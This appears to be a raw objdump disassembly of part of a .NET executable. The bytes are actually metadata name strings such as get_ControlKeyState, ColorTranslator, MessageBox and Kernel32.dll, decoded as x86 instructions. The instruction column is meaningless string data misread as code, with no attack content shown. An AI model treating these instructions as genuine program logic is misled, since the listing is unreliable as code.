  408c95:	4b                   	dec    %ebx
  408c96:	65 79 44             	gs jns 0x408cdd
  408c99:	6f                   	outsl  %ds:(%esi),(%dx)
  408c9a:	77 6e                	ja     0x408d0a
  408c9c:	00 43 6f             	add    %al,0x6f(%ebx)
  408c9f:	6e                   	outsb  %ds:(%esi),(%dx)
  408ca0:	74 72                	je     0x408d14
  408ca2:	6f                   	outsl  %ds:(%esi),(%dx)
  408ca3:	6c                   	insb   (%dx),%es:(%edi)
  408ca4:	4b                   	dec    %ebx
  408ca5:	65 79 53             	gs jns 0x408cfb
  408ca8:	74 61                	je     0x408d0b
  408caa:	74 65                	je     0x408d11
  408cac:	73 00                	jae    0x408cae
  408cae:	73 65                	jae    0x408d15
  408cb0:	74 5f                	je     0x408d11
  408cb2:	43                   	inc    %ebx
  408cb3:	6f                   	outsl  %ds:(%esi),(%dx)
  408cb4:	6e                   	outsb  %ds:(%esi),(%dx)
  408cb5:	74 72                	je     0x408d29
  408cb7:	6f                   	outsl  %ds:(%esi),(%dx)
  408cb8:	6c                   	insb   (%dx),%es:(%edi)
  408cb9:	4b                   	dec    %ebx
  408cba:	65 79 53             	gs jns 0x408d10
  408cbd:	74 61                	je     0x408d20
  408cbf:	74 65                	je     0x408d26
  408cc1:	00 67 65             	add    %ah,0x65(%edi)
  408cc4:	74 5f                	je     0x408d25
  408cc6:	43                   	inc    %ebx
  408cc7:	6f                   	outsl  %ds:(%esi),(%dx)
  408cc8:	6e                   	outsb  %ds:(%esi),(%dx)
  408cc9:	74 72                	je     0x408d3d
  408ccb:	6f                   	outsl  %ds:(%esi),(%dx)
  408ccc:	6c                   	insb   (%dx),%es:(%edi)
  408ccd:	4b                   	dec    %ebx
  408cce:	65 79 53             	gs jns 0x408d24
  408cd1:	74 61                	je     0x408d34
  408cd3:	74 65                	je     0x408d3a
  408cd5:	00 67 65             	add    %ah,0x65(%edi)
  408cd8:	74 5f                	je     0x408d39
  408cda:	4d                   	dec    %ebp
  408cdb:	6f                   	outsl  %ds:(%esi),(%dx)
  408cdc:	64 69 66 69 65 72 73 	imul   $0x737265,%fs:0x69(%esi),%esp
  408ce3:	00 
  408ce4:	67 65 74 5f          	addr16 gs je 0x408d47
  408ce8:	42                   	inc    %edx
  408ce9:	6c                   	insb   (%dx),%es:(%edi)
  408cea:	61                   	popa
  408ceb:	63 6b 00             	arpl   %ebp,0x0(%ebx)
  408cee:	67 65 74 5f          	addr16 gs je 0x408d51
  408cf2:	42                   	inc    %edx
  408cf3:	6c                   	insb   (%dx),%es:(%edi)
  408cf4:	75 65                	jne    0x408d5b
  408cf6:	00 67 65             	add    %ah,0x65(%edi)
  408cf9:	74 5f                	je     0x408d5a
  408cfb:	43                   	inc    %ebx
  408cfc:	79 61                	jns    0x408d5f
  408cfe:	6e                   	outsb  %ds:(%esi),(%dx)
  408cff:	00 43 6f             	add    %al,0x6f(%ebx)
  408d02:	6c                   	insb   (%dx),%es:(%edi)
  408d03:	6f                   	outsl  %ds:(%esi),(%dx)
  408d04:	72 54                	jb     0x408d5a
  408d06:	72 61                	jb     0x408d69
  408d08:	6e                   	outsb  %ds:(%esi),(%dx)
  408d09:	73 6c                	jae    0x408d77
  408d0b:	61                   	popa
  408d0c:	74 6f                	je     0x408d7d
  408d0e:	72 00                	jb     0x408d10
  408d10:	46                   	inc    %esi
  408d11:	72 6f                	jb     0x408d82
  408d13:	6d                   	insl   (%dx),%es:(%edi)
  408d14:	48                   	dec    %eax
  408d15:	74 6d                	je     0x408d84
  408d17:	6c                   	insb   (%dx),%es:(%edi)
  408d18:	00 67 65             	add    %ah,0x65(%edi)
  408d1b:	74 5f                	je     0x408d7c
  408d1d:	4d                   	dec    %ebp
  408d1e:	61                   	popa
  408d1f:	67 65 6e             	outsb  %gs:(%si),(%dx)
  408d22:	74 61                	je     0x408d85
  408d24:	00 67 65             	add    %ah,0x65(%edi)
  408d27:	74 5f                	je     0x408d88
  408d29:	52                   	push   %edx
  408d2a:	65 64 00 67 65       	gs add %ah,%fs:0x65(%edi)
  408d2f:	74 5f                	je     0x408d90
  408d31:	57                   	push   %edi
  408d32:	68 69 74 65 00       	push   $0x657469
  408d37:	67 65 74 5f          	addr16 gs je 0x408d9a
  408d3b:	59                   	pop    %ecx
  408d3c:	65 6c                	gs insb (%dx),%es:(%edi)
  408d3e:	6c                   	insb   (%dx),%es:(%edi)
  408d3f:	6f                   	outsl  %ds:(%esi),(%dx)
  408d40:	77 00                	ja     0x408d42
  408d42:	53                   	push   %ebx
  408d43:	75 73                	jne    0x408db8
  408d45:	70 65                	jo     0x408dac
  408d47:	6e                   	outsb  %ds:(%esi),(%dx)
  408d48:	64 4c                	fs dec %esp
  408d4a:	61                   	popa
  408d4b:	79 6f                	jns    0x408dbc
  408d4d:	75 74                	jne    0x408dc3
  408d4f:	00 53 63             	add    %dl,0x63(%ebx)
  408d52:	72 6f                	jb     0x408dc3
  408d54:	6c                   	insb   (%dx),%es:(%edi)
  408d55:	6c                   	insb   (%dx),%es:(%edi)
  408d56:	61                   	popa
  408d57:	62 6c 65 43          	bound  %ebp,0x43(%ebp,%eiz,2)
  408d5b:	6f                   	outsl  %ds:(%esi),(%dx)
  408d5c:	6e                   	outsb  %ds:(%esi),(%dx)
  408d5d:	74 72                	je     0x408dd1
  408d5f:	6f                   	outsl  %ds:(%esi),(%dx)
  408d60:	6c                   	insb   (%dx),%es:(%edi)
  408d61:	00 73 65             	add    %dh,0x65(%ebx)
  408d64:	74 5f                	je     0x408dc5
  408d66:	41                   	inc    %ecx
  408d67:	75 74                	jne    0x408ddd
  408d69:	6f                   	outsl  %ds:(%esi),(%dx)
  408d6a:	53                   	push   %ebx
  408d6b:	63 72 6f             	arpl   %esi,0x6f(%edx)
  408d6e:	6c                   	insb   (%dx),%es:(%edi)
  408d6f:	6c                   	insb   (%dx),%es:(%edi)
  408d70:	00 73 65             	add    %dh,0x65(%ebx)
  408d73:	74 5f                	je     0x408dd4
  408d75:	42                   	inc    %edx
  408d76:	61                   	popa
  408d77:	63 6b 43             	arpl   %ebp,0x43(%ebx)
  408d7a:	6f                   	outsl  %ds:(%esi),(%dx)
  408d7b:	6c                   	insb   (%dx),%es:(%edi)
  408d7c:	6f                   	outsl  %ds:(%esi),(%dx)
  408d7d:	72 00                	jb     0x408d7f
  408d7f:	73 65                	jae    0x408de6
  408d81:	74 5f                	je     0x408de2
  408d83:	43                   	inc    %ebx
  408d84:	6f                   	outsl  %ds:(%esi),(%dx)
  408d85:	6e                   	outsb  %ds:(%esi),(%dx)
  408d86:	74 72                	je     0x408dfa
  408d88:	6f                   	outsl  %ds:(%esi),(%dx)
  408d89:	6c                   	insb   (%dx),%es:(%edi)
  408d8a:	42                   	inc    %edx
  408d8b:	6f                   	outsl  %ds:(%esi),(%dx)
  408d8c:	78 00                	js     0x408d8e
  408d8e:	52                   	push   %edx
  408d8f:	65 73 75             	gs jae 0x408e07
  408d92:	6d                   	insl   (%dx),%es:(%edi)
  408d93:	65 4c                	gs dec %esp
  408d95:	61                   	popa
  408d96:	79 6f                	jns    0x408e07
  408d98:	75 74                	jne    0x408e0e
  408d9a:	00 45 6c             	add    %al,0x6c(%ebp)
  408d9d:	61                   	popa
  408d9e:	70 73                	jo     0x408e13
  408da0:	65 64 45             	gs fs inc %ebp
  408da3:	76 65                	jbe    0x408e0a
  408da5:	6e                   	outsb  %ds:(%esi),(%dx)
  408da6:	74 48                	je     0x408df0
  408da8:	61                   	popa
  408da9:	6e                   	outsb  %ds:(%esi),(%dx)
  408daa:	64 6c                	fs insb (%dx),%es:(%edi)
  408dac:	65 72 00             	gs jb  0x408daf
  408daf:	61                   	popa
  408db0:	64 64 5f             	fs fs pop %edi
  408db3:	45                   	inc    %ebp
  408db4:	6c                   	insb   (%dx),%es:(%edi)
  408db5:	61                   	popa
  408db6:	70 73                	jo     0x408e2b
  408db8:	65 64 00 73 65       	gs add %dh,%fs:0x65(%ebx)
  408dbd:	74 5f                	je     0x408e1e
  408dbf:	49                   	dec    %ecx
  408dc0:	6e                   	outsb  %ds:(%esi),(%dx)
  408dc1:	74 65                	je     0x408e28
  408dc3:	72 76                	jb     0x408e3b
  408dc5:	61                   	popa
  408dc6:	6c                   	insb   (%dx),%es:(%edi)
  408dc7:	00 73 65             	add    %dh,0x65(%ebx)
  408dca:	74 5f                	je     0x408e2b
  408dcc:	41                   	inc    %ecx
  408dcd:	75 74                	jne    0x408e43
  408dcf:	6f                   	outsl  %ds:(%esi),(%dx)
  408dd0:	52                   	push   %edx
  408dd1:	65 73 65             	gs jae 0x408e39
  408dd4:	74 00                	je     0x408dd6
  408dd6:	53                   	push   %ebx
  408dd7:	74 61                	je     0x408e3a
  408dd9:	72 74                	jb     0x408e4f
  408ddb:	00 67 65             	add    %ah,0x65(%edi)
  408dde:	74 5f                	je     0x408e3f
  408de0:	49                   	dec    %ecx
  408de1:	74 65                	je     0x408e48
  408de3:	6d                   	insl   (%dx),%es:(%edi)
  408de4:	00 73 65             	add    %dh,0x65(%ebx)
  408de7:	74 5f                	je     0x408e48
  408de9:	56                   	push   %esi
  408dea:	61                   	popa
  408deb:	6c                   	insb   (%dx),%es:(%edi)
  408dec:	75 65                	jne    0x408e53
  408dee:	00 52 65             	add    %dl,0x65(%edx)
  408df1:	66 72 65             	data16 jb 0x408e59
  408df4:	73 68                	jae    0x408e5e
  408df6:	00 73 65             	add    %dh,0x65(%ebx)
  408df9:	74 5f                	je     0x408e5a
  408dfb:	4c                   	dec    %esp
  408dfc:	65 66 74 00          	gs data16 je 0x408e00
  408e00:	73 65                	jae    0x408e67
  408e02:	74 5f                	je     0x408e63
  408e04:	54                   	push   %esp
  408e05:	6f                   	outsl  %ds:(%esi),(%dx)
  408e06:	70 00                	jo     0x408e08
  408e08:	46                   	inc    %esi
  408e09:	6f                   	outsl  %ds:(%esi),(%dx)
  408e0a:	6e                   	outsb  %ds:(%esi),(%dx)
  408e0b:	74 00                	je     0x408e0d
  408e0d:	67 65 74 5f          	addr16 gs je 0x408e70
  408e11:	46                   	inc    %esi
  408e12:	6f                   	outsl  %ds:(%esi),(%dx)
  408e13:	6e                   	outsb  %ds:(%esi),(%dx)
  408e14:	74 00                	je     0x408e16
  408e16:	46                   	inc    %esi
  408e17:	6f                   	outsl  %ds:(%esi),(%dx)
  408e18:	6e                   	outsb  %ds:(%esi),(%dx)
  408e19:	74 53                	je     0x408e6e
  408e1b:	74 79                	je     0x408e96
  408e1d:	6c                   	insb   (%dx),%es:(%edi)
  408e1e:	65 00 73 65          	add    %dh,%gs:0x65(%ebx)
  408e22:	74 5f                	je     0x408e83
  408e24:	46                   	inc    %esi
  408e25:	6f                   	outsl  %ds:(%esi),(%dx)
  408e26:	6e                   	outsb  %ds:(%esi),(%dx)
  408e27:	74 00                	je     0x408e29
  408e29:	50                   	push   %eax
  408e2a:	72 6f                	jb     0x408e9b
  408e2c:	67 72 65             	addr16 jb 0x408e94
  408e2f:	73 73                	jae    0x408ea4
  408e31:	42                   	inc    %edx
  408e32:	61                   	popa
  408e33:	72 53                	jb     0x408e88
  408e35:	74 79                	je     0x408eb0
  408e37:	6c                   	insb   (%dx),%es:(%edi)
  408e38:	65 00 73 65          	add    %dh,%gs:0x65(%ebx)
  408e3c:	74 5f                	je     0x408e9d
  408e3e:	53                   	push   %ebx
  408e3f:	74 79                	je     0x408eba
  408e41:	6c                   	insb   (%dx),%es:(%edi)
  408e42:	65 00 73 65          	add    %dh,%gs:0x65(%ebx)
  408e46:	74 5f                	je     0x408ea7
  408e48:	46                   	inc    %esi
  408e49:	6f                   	outsl  %ds:(%esi),(%dx)
  408e4a:	72 65                	jb     0x408eb1
  408e4c:	43                   	inc    %ebx
  408e4d:	6f                   	outsl  %ds:(%esi),(%dx)
  408e4e:	6c                   	insb   (%dx),%es:(%edi)
  408e4f:	6f                   	outsl  %ds:(%esi),(%dx)
  408e50:	72 00                	jb     0x408e52
  408e52:	73 65                	jae    0x408eb9
  408e54:	74 5f                	je     0x408eb5
  408e56:	53                   	push   %ebx
  408e57:	69 7a 65 00 67 65 74 	imul   $0x74656700,0x65(%edx),%edi
  408e5e:	5f                   	pop    %edi
  408e5f:	41                   	inc    %ecx
  408e60:	63 74 69 76          	arpl   %esi,0x76(%ecx,%ebp,2)
  408e64:	69 74 79 49 64 00 50 	imul   $0x72500064,0x49(%ecx,%edi,2),%esi
  408e6b:	72 
  408e6c:	6f                   	outsl  %ds:(%esi),(%dx)
  408e6d:	67 72 65             	addr16 jb 0x408ed5
  408e70:	73 73                	jae    0x408ee5
  408e72:	52                   	push   %edx
  408e73:	65 63 6f 72          	arpl   %ebp,%gs:0x72(%edi)
  408e77:	64 54                	fs push %esp
  408e79:	79 70                	jns    0x408eeb
  408e7b:	65 00 67 65          	add    %ah,%gs:0x65(%edi)
  408e7f:	74 5f                	je     0x408ee0
  408e81:	52                   	push   %edx
  408e82:	65 63 6f 72          	arpl   %ebp,%gs:0x72(%edi)
  408e86:	64 54                	fs push %esp
  408e88:	79 70                	jns    0x408efa
  408e8a:	65 00 52 65          	add    %dl,%gs:0x65(%edx)
  408e8e:	6d                   	insl   (%dx),%es:(%edi)
  408e8f:	6f                   	outsl  %ds:(%esi),(%dx)
  408e90:	76 65                	jbe    0x408ef7
  408e92:	00 53 79             	add    %dl,0x79(%ebx)
  408e95:	73 74                	jae    0x408f0b
  408e97:	65 6d                	gs insl (%dx),%es:(%edi)
  408e99:	2e 43                	cs inc %ebx
  408e9b:	6f                   	outsl  %ds:(%esi),(%dx)
  408e9c:	6d                   	insl   (%dx),%es:(%edi)
  408e9d:	70 6f                	jo     0x408f0e
  408e9f:	6e                   	outsb  %ds:(%esi),(%dx)
  408ea0:	65 6e                	outsb  %gs:(%esi),(%dx)
  408ea2:	74 4d                	je     0x408ef1
  408ea4:	6f                   	outsl  %ds:(%esi),(%dx)
  408ea5:	64 65 6c             	fs gs insb (%dx),%es:(%edi)
  408ea8:	00 43 6f             	add    %al,0x6f(%ebx)
  408eab:	6d                   	insl   (%dx),%es:(%edi)
  408eac:	70 6f                	jo     0x408f1d
  408eae:	6e                   	outsb  %ds:(%esi),(%dx)
  408eaf:	65 6e                	outsb  %gs:(%esi),(%dx)
  408eb1:	74 00                	je     0x408eb3
  408eb3:	52                   	push   %edx
  408eb4:	65 6d                	gs insl (%dx),%es:(%edi)
  408eb6:	6f                   	outsl  %ds:(%esi),(%dx)
  408eb7:	76 65                	jbe    0x408f1e
  408eb9:	41                   	inc    %ecx
  408eba:	74 00                	je     0x408ebc
  408ebc:	53                   	push   %ebx
  408ebd:	74 6f                	je     0x408f2e
  408ebf:	70 00                	jo     0x408ec1
  408ec1:	67 65 74 5f          	addr16 gs je 0x408f24
  408ec5:	50                   	push   %eax
  408ec6:	61                   	popa
  408ec7:	72 65                	jb     0x408f2e
  408ec9:	6e                   	outsb  %ds:(%esi),(%dx)
  408eca:	74 41                	je     0x408f0d
  408ecc:	63 74 69 76          	arpl   %esi,0x76(%ecx,%ebp,2)
  408ed0:	69 74 79 49 64 00 49 	imul   $0x6e490064,0x49(%ecx,%edi,2),%esi
  408ed7:	6e 
  408ed8:	73 65                	jae    0x408f3f
  408eda:	72 74                	jb     0x408f50
  408edc:	00 67 65             	add    %ah,0x65(%edi)
  408edf:	74 5f                	je     0x408f40
  408ee1:	41                   	inc    %ecx
  408ee2:	63 74 69 76          	arpl   %esi,0x76(%ecx,%ebp,2)
  408ee6:	69 74 79 00 67 65 74 	imul   $0x5f746567,0x0(%ecx,%edi,2),%esi
  408eed:	5f 
  408eee:	53                   	push   %ebx
  408eef:	74 61                	je     0x408f52
  408ef1:	74 75                	je     0x408f68
  408ef3:	73 44                	jae    0x408f39
  408ef5:	65 73 63             	gs jae 0x408f5b
  408ef8:	72 69                	jb     0x408f63
  408efa:	70 74                	jo     0x408f70
  408efc:	69 6f 6e 00 67 65 74 	imul   $0x74656700,0x6e(%edi),%ebp
  408f03:	5f                   	pop    %edi
  408f04:	50                   	push   %eax
  408f05:	65 72 63             	gs jb  0x408f6b
  408f08:	65 6e                	outsb  %gs:(%esi),(%dx)
  408f0a:	74 43                	je     0x408f4f
  408f0c:	6f                   	outsl  %ds:(%esi),(%dx)
  408f0d:	6d                   	insl   (%dx),%es:(%edi)
  408f0e:	70 6c                	jo     0x408f7c
  408f10:	65 74 65             	gs je  0x408f78
  408f13:	00 67 65             	add    %ah,0x65(%edi)
  408f16:	74 5f                	je     0x408f77
  408f18:	53                   	push   %ebx
  408f19:	65 63 6f 6e          	arpl   %ebp,%gs:0x6e(%edi)
  408f1d:	64 73 52             	fs jae 0x408f72
  408f20:	65 6d                	gs insl (%dx),%es:(%edi)
  408f22:	61                   	popa
  408f23:	69 6e 69 6e 67 00 54 	imul   $0x5400676e,0x69(%esi),%ebp
  408f2a:	69 6d 65 53 70 61 6e 	imul   $0x6e617053,0x65(%ebp),%ebp
  408f31:	00 67 65             	add    %ah,0x65(%edi)
  408f34:	74 5f                	je     0x408f95
  408f36:	54                   	push   %esp
  408f37:	6f                   	outsl  %ds:(%esi),(%dx)
  408f38:	74 61                	je     0x408f9b
  408f3a:	6c                   	insb   (%dx),%es:(%edi)
  408f3b:	48                   	dec    %eax
  408f3c:	6f                   	outsl  %ds:(%esi),(%dx)
  408f3d:	75 72                	jne    0x408fb1
  408f3f:	73 00                	jae    0x408f41
  408f41:	49                   	dec    %ecx
  408f42:	6e                   	outsb  %ds:(%esi),(%dx)
  408f43:	74 33                	je     0x408f78
  408f45:	32 00                	xor    (%eax),%al
  408f47:	67 65 74 5f          	addr16 gs je 0x408faa
  408f4b:	4d                   	dec    %ebp
  408f4c:	69 6e 75 74 65 73 00 	imul   $0x736574,0x75(%esi),%ebp
  408f53:	67 65 74 5f          	addr16 gs je 0x408fb6
  408f57:	53                   	push   %ebx
  408f58:	65 63 6f 6e          	arpl   %ebp,%gs:0x6e(%edi)
  408f5c:	64 73 00             	fs jae 0x408f5f
  408f5f:	46                   	inc    %esi
  408f60:	6f                   	outsl  %ds:(%esi),(%dx)
  408f61:	72 6d                	jb     0x408fd0
  408f63:	61                   	popa
  408f64:	74 00                	je     0x408f66
  408f66:	43                   	inc    %ebx
  408f67:	6f                   	outsl  %ds:(%esi),(%dx)
  408f68:	6e                   	outsb  %ds:(%esi),(%dx)
  408f69:	63 61 74             	arpl   %esp,0x74(%ecx)
  408f6c:	00 67 65             	add    %ah,0x65(%edi)
  408f6f:	74 5f                	je     0x408fd0
  408f71:	43                   	inc    %ebx
  408f72:	75 72                	jne    0x408fe6
  408f74:	72 65                	jb     0x408fdb
  408f76:	6e                   	outsb  %ds:(%esi),(%dx)
  408f77:	74 4f                	je     0x408fc8
  408f79:	70 65                	jo     0x408fe0
  408f7b:	72 61                	jb     0x408fde
  408f7d:	74 69                	je     0x408fe8
  408f7f:	6f                   	outsl  %ds:(%esi),(%dx)
  408f80:	6e                   	outsb  %ds:(%esi),(%dx)
  408f81:	00 41 70             	add    %al,0x70(%ecx)
  408f84:	70 6c                	jo     0x408ff2
  408f86:	69 63 61 74 69 6f 6e 	imul   $0x6e6f6974,0x61(%ebx),%esp
  408f8d:	00 44 6f 45          	add    %al,0x45(%edi,%ebp,2)
  408f91:	76 65                	jbe    0x408ff8
  408f93:	6e                   	outsb  %ds:(%esi),(%dx)
  408f94:	74 73                	je     0x409009
  408f96:	00 4b 65             	add    %cl,0x65(%ebx)
  408f99:	72 6e                	jb     0x409009
  408f9b:	65 6c                	gs insb (%dx),%es:(%edi)
  408f9d:	33 32                	xor    (%edx),%esi
  408f9f:	2e 64 6c             	cs fs insb (%dx),%es:(%edi)
  408fa2:	6c                   	insb   (%dx),%es:(%edi)
  408fa3:	00 4d 65             	add    %cl,0x65(%ebp)
  408fa6:	73 73                	jae    0x40901b
  408fa8:	61                   	popa
  408fa9:	67 65 42             	addr16 gs inc %edx
  408fac:	6f                   	outsl  %ds:(%esi),(%dx)
  408fad:	78 00                	js     0x408faf
  408faf:	67 65 74 5f          	addr16 gs je 0x409012
  408fb3:	50                   	push   %eax
  408fb4:	61                   	popa
  408fb5:	72 61                	jb     0x409018
  408fb7:	6d                   	insl   (%dx),%es:(%edi)
  408fb8:	65 74 65             	gs je  0x409020
  408fbb:	72 41                	jb     0x408ffe
  408fbd:	73 73                	jae    0x409032
  408fbf:	65 6d                	gs insl (%dx),%es:(%edi)
  408fc1:	62 6c 79 46          	bound  %ebp,0x46(%ecx,%edi,2)
  408fc5:	75 6c                	jne    0x409033
  408fc7:	6c                   	insb   (%dx),%es:(%edi)
  408fc8:	4e                   	dec    %esi
  408fc9:	61                   	popa
  408fca:	6d                   	insl   (%dx),%es:(%edi)
  408fcb:	65 00 54 79 70       	add    %dl,%gs:0x70(%ecx,%edi,2)
  408fd0:	65 00 52 75          	add    %dl,%gs:0x75(%edx)
  408fd4:	6e                   	outsb  %ds:(%esi),(%dx)
  408fd5:	74 69                	je     0x409040
  408fd7:	6d                   	insl   (%dx),%es:(%edi)
  408fd8:	65 54                	gs push %esp
  408fda:	79 70                	jns    0x40904c
  408fdc:	65 48                	gs dec %eax
  408fde:	61                   	popa
  408fdf:	6e                   	outsb  %ds:(%esi),(%dx)
  408fe0:	64 6c                	fs insb (%dx),%es:(%edi)
  408fe2:	65 00 47 65          	add    %al,%gs:0x65(%edi)
  408fe6:	74 54                	je     0x40903c
  408fe8:	79 70                	jns    0x40905a
  408fea:	65 46                	gs inc %esi
  408fec:	72 6f                	jb     0x40905d
  408fee:	6d                   	insl   (%dx),%es:(%edi)
  408fef:	48                   	dec    %eax
  408ff0:	61                   	popa
  408ff1:	6e                   	outsb  %ds:(%esi),(%dx)
  408ff2:	64 6c                	fs insb (%dx),%es:(%edi)
  408ff4:	65 00 47 65          	add    %al,%gs:0x65(%edi)
  408ff8:	74 54                	je     0x40904e
  408ffa:	79 70                	jns    0x40906c
  408ffc:	65 00 67 65          	add    %ah,%gs:0x65(%edi)
  409000:	74 5f                	je     0x409061
  409002:	49                   	dec    %ecx
  409003:	73 41                	jae    0x409046
  409005:	72 72                	jb     0x409079
  409007:	61                   	popa
  409008:	79 00                	jns    0x40900a
  40900a:	47                   	inc    %edi
  40900b:	65 74 45             	gs je  0x409053
  40900e:	6c                   	insb   (%dx),%es:(%edi)
  40900f:	65 6d                	gs insl (%dx),%es:(%edi)
  409011:	65 6e                	outsb  %gs:(%esi),(%dx)
  409013:	74 54                	je     0x409069
  409015:	79 70                	jns    0x409087
  409017:	65 00 43 68          	add    %al,%gs:0x68(%ebx)
  40901b:	61                   	popa
  40901c:	72 00                	jb     0x40901e
  40901e:	4d                   	dec    %ebp
  40901f:	61                   	popa
  409020:	6b 65 47 65          	imul   $0x65,0x47(%ebp),%esp
  409024:	6e                   	outsb  %ds:(%esi),(%dx)
  409025:	65 72 69             	gs jb  0x409091
  409028:	63 54 79 70          	arpl   %edx,0x70(%ecx,%edi,2)
  40902c:	65 00 45 6d          	add    %al,%gs:0x6d(%ebp)
  409030:	70 74                	jo     0x4090a6
  409032:	79 54                	jns    0x409088
  409034:	79 70                	jns    0x4090a6
  409036:	65 73 00             	gs jae 0x409039
  409039:	43                   	inc    %ebx
  40903a:	6f                   	outsl  %ds:(%esi),(%dx)
  40903b:	6e                   	outsb  %ds:(%esi),(%dx)
  40903c:	73 74                	jae    0x4090b2
  40903e:	72 75                	jb     0x4090b5
  409040:	63 74 6f 72          	arpl   %esi,0x72(%edi,%ebp,2)
  409044:	49                   	dec    %ecx
  409045:	6e                   	outsb  %ds:(%esi),(%dx)
  409046:	66 6f                	outsw  %ds:(%esi),(%dx)
  409048:	00 42 69             	add    %al,0x69(%edx)
  40904b:	6e                   	outsb  %ds:(%esi),(%dx)
  40904c:	64 69 6e 67 46 6c 61 	imul   $0x67616c46,%fs:0x67(%esi),%ebp
  409053:	67 
  409054:	73 00                	jae    0x409056
  409056:	42                   	inc    %edx
  409057:	69 6e 64 65 72 00 50 	imul   $0x50007265,0x64(%esi),%ebp
  40905e:	61                   	popa
  40905f:	72 61                	jb     0x4090c2
  409061:	6d                   	insl   (%dx),%es:(%edi)
  409062:	65 74 65             	gs je  0x4090ca
  409065:	72 4d                	jb     0x4090b4
  409067:	6f                   	outsl  %ds:(%esi),(%dx)
  409068:	64 69 66 69 65 72 00 	imul   $0x47007265,%fs:0x69(%esi),%esp
  40906f:	47 
  409070:	65 74 43             	gs je  0x4090b6
  409073:	6f                   	outsl  %ds:(%esi),(%dx)
  409074:	6e                   	outsb  %ds:(%esi),(%dx)
  409075:	73 74                	jae    0x4090eb
  409077:	72 75                	jb     0x4090ee
  409079:	63 74 6f 72          	arpl   %esi,0x72(%edi,%ebp,2)
  40907d:	00 49 6e             	add    %cl,0x6e(%ecx)
  409080:	76 6f                	jbe    0x4090f1
  409082:	6b 65 00 43          	imul   $0x43,0x0(%ebp),%esp
  409086:	6f                   	outsl  %ds:(%esi),(%dx)
  409087:	6e                   	outsb  %ds:(%esi),(%dx)
  409088:	76 65                	jbe    0x4090ef
  40908a:	72 74                	jb     0x409100
  40908c:	00 43 68             	add    %al,0x68(%ebx)
  40908f:	61                   	popa
  409090:	6e                   	outsb  %ds:(%esi),(%dx)
  409091:	67 65 54             	addr16 gs push %esp
  409094:	79 70                	jns    0x409106
  409096:	65 00 49 6e          	add    %cl,%gs:0x6e(%ecx)
  40909a:	76 6f                	jbe    0x40910b
  40909c:	6b 65 4d 65          	imul   $0x65,0x4d(%ebp),%esp
  4090a0:	6d                   	insl   (%dx),%es:(%edi)
  4090a1:	62 65 72             	bound  %esp,0x72(%ebp)
  4090a4:	00 41 72             	add    %al,0x72(%ecx)
  4090a7:	72 61                	jb     0x40910a
  4090a9:	79 00                	jns    0x4090ab
  4090ab:	6f                   	outsl  %ds:(%esi),(%dx)
  4090ac:	70 5f                	jo     0x40910d
  4090ae:	49                   	dec    %ecx
  4090af:	6e                   	outsb  %ds:(%esi),(%dx)
  4090b0:	65 71 75             	gs jno 0x409128
  4090b3:	61                   	popa
  4090b4:	6c                   	insb   (%dx),%es:(%edi)
  4090b5:	69 74 79 00 6f 70 5f 	imul   $0x455f706f,0x0(%ecx,%edi,2),%esi
  4090bc:	45 
  4090bd:	71 75                	jno    0x409134
  4090bf:	61                   	popa
  4090c0:	6c                   	insb   (%dx),%es:(%edi)
  4090c1:	69 74 79 00 67 65 74 	imul   $0x5f746567,0x0(%ecx,%edi,2),%esi
  4090c8:	5f 
  4090c9:	44                   	inc    %esp
  4090ca:	65 66 61             	gs popaw
  4090cd:	75 6c                	jne    0x40913b
  4090cf:	74 56                	je     0x409127
  4090d1:	61                   	popa
  4090d2:	6c                   	insb   (%dx),%es:(%edi)
  4090d3:	75 65                	jne    0x40913a
  4090d5:	00 45 78             	add    %al,0x78(%ebp)
  4090d8:	63 65 70             	arpl   %esp,0x70(%ebp)
  4090db:	74 69                	je     0x409146
  4090dd:	6f                   	outsl  %ds:(%esi),(%dx)
  4090de:	6e                   	outsb  %ds:(%esi),(%dx)
  4090df:	00 54 6f 43          	add    %dl,0x43(%edi,%ebp,2)
  4090e3:	68 61 72 41 72       	push   $0x72417261
  4090e8:	72 61                	jb     0x40914b
  4090ea:	79 00                	jns    0x4090ec
  4090ec:	41                   	inc    %ecx
  4090ed:	70 70                	jo     0x40915f
  4090ef:	65 6e                	outsb  %gs:(%esi),(%dx)
  4090f1:	64 43                	fs inc %ebx
  4090f3:	68 61 72 00 43       	push   $0x43007261
  4090f8:	6f                   	outsl  %ds:(%esi),(%dx)
  4090f9:	6e                   	outsb  %ds:(%esi),(%dx)
  4090fa:	73 6f                	jae    0x40916b
  4090fc:	6c                   	insb   (%dx),%es:(%edi)
  4090fd:	65 00 43 6f          	add    %al,%gs:0x6f(%ebx)
  409101:	6e                   	outsb  %ds:(%esi),(%dx)
  409102:	73 6f                	jae    0x409173
  409104:	6c                   	insb   (%dx),%es:(%edi)
  409105:	65 4b                	gs dec %ebx
  409107:	65 79 49             	gs jns 0x409153
  40910a:	6e                   	outsb  %ds:(%esi),(%dx)
  40910b:	66 6f                	outsw  %ds:(%esi),(%dx)
  40910d:	00 43 6f             	add    %al,0x6f(%ebx)
  409110:	6e                   	outsb  %ds:(%esi),(%dx)
  409111:	73 6f                	jae    0x409182
  409113:	6c                   	insb   (%dx),%es:(%edi)
  409114:	65 4b                	gs dec %ebx
  409116:	65 79 00             	gs jns 0x409119
  409119:	67 65 74 5f          	addr16 gs je 0x40917c
  40911d:	4b                   	dec    %ebx
  40911e:	65 79 00             	gs jns 0x409121
  409121:	67 65 74 5f          	addr16 gs je 0x409184
  409125:	4c                   	dec    %esp
  409126:	65 6e                	outsb  %gs:(%esi),(%dx)
  409128:	67 74 68             	addr16 je 0x409193
  40912b:	00 67 65             	add    %ah,0x65(%edi)
  40912e:	74 5f                	je     0x40918f
  409130:	4b                   	dec    %ebx
  409131:	65 79 43             	gs jns 0x409177
  409134:	68 61 72 00 53       	push   $0x53007261
  409139:	79 73                	jns    0x4091ae
  40913b:	74 65                	je     0x4091a2
  40913d:	6d                   	insl   (%dx),%es:(%edi)
  40913e:	2e 54                	cs push %esp
  409140:	68 72 65 61 64       	push   $0x64616572
  409145:	69 6e 67 00 54 68 72 	imul   $0x72685400,0x67(%esi),%ebp
  40914c:	65 61                	gs popa
  40914e:	64 00 67 65          	add    %ah,%fs:0x65(%edi)
  409152:	74 5f                	je     0x4091b3
  409154:	43                   	inc    %ebx
  409155:	75 72                	jne    0x4091c9
  409157:	72 65                	jb     0x4091be
  409159:	6e                   	outsb  %ds:(%esi),(%dx)
  40915a:	74 54                	je     0x4091b0
  40915c:	68 72 65 61 64       	push   $0x64616572
  409161:	00 4e 65             	add    %cl,0x65(%esi)
